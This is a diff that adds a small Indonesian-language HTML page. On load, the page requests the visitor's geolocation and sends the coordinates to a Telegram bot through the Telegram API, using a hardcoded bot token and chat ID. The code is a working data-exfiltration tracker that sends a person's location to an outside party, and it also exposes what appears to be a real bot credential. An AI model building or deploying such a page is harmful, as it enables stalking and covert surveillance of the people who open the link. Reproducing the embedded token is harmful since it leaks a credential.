@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pelacakan Lokasi</title>
+</head>
+<body>
+  <h2>Melacak Lokasi Pengguna...</h2>
+  <p id="status">Meminta izin lokasi...</p>
+
+  <script>
+    const telegramBotToken = '7716589580:AAHh-66I9FYbYLYjpcN2F40dHeoUYwUvWzk'; // Ganti dengan token bot kamu
+    const chatId = '5665946730'; // Ganti dengan chat ID kamu
+
+    function sendLocationToTelegram(lat, lon) {
+      const message = `Lokasi pengguna:\nLatitude: ${lat}\nLongitude: ${lon}`;
+      const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+      fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          document.getElementById('status').textContent = 'Lokasi berhasil dikirim ke Telegram!';
+        } else {
+          document.getElementById('status').textContent = 'Gagal mengirim lokasi ke Telegram.';
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        document.getElementById('status').textContent = 'Terjadi kesalahan saat mengirim data.';
+      });
+    }
+
+    function getLocation() {
+      if (!navigator.geolocation) {
+        document.getElementById('status').textContent = 'Geolocation tidak didukung oleh browser ini.';
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition((position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        document.getElementById('status').textContent = `Lokasi ditemukan: ${lat}, ${lon}`;
+        sendLocationToTelegram(lat, lon);
+      }, (error) => {
+        document.getElementById('status').textContent = 'Gagal mendapatkan lokasi.';
+        console.error(error);
+      });
+    }
+
+    getLocation();
+  </script>
+</body>
+</html>
